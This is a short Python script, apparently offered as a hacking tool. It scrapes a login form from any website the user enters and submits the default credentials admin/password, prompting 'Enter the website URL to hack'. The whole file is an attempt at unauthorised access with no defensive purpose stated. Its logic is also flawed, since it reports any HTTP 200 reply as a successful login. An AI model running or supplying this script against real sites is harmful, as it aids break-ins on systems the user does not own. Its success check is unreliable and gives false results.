import requests
from bs4 import BeautifulSoup

def hack_website(url):
    try:
        # Send a GET request to the website
        response = requests.get(url)

        # Check if the request was successful
        if response.status_code == 200:
            # Parse the HTML content using BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find login form
            login_form = soup.find('form', {'id': 'loginForm'})

            # Check if login form exists
            if login_form:
                # Extract form action URL
                form_action_url = login_form.get('action')

                # Extract form input fields
                form_inputs = login_form.find_all('input')

                # Create a dictionary to store form data
                form_data = {}
                for input_field in form_inputs:
                    field_name = input_field.get('name')
                    field_value = input_field.get('value')
                    if field_name and field_value:
                        form_data[field_name] = field_value

                # Modify the form data with known credentials
                form_data['username'] = 'admin'
                form_data['password'] = 'password'

                # Send a POST request to the login URL with the modified form data
                login_response = requests.post(form_action_url, data=form_data)

                # Check if login was successful
                if login_response.status_code == 200:
                    print("Login successful!")
                else:
                    print("Login failed.")
            else:
                print("Login form not found.")
        else:
            print(f"Failed to retrieve the website content. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while fetching the website: {e}")

# Prompt the user for the website URL
url = input("Enter the website URL to hack: ")
hack_website(url)
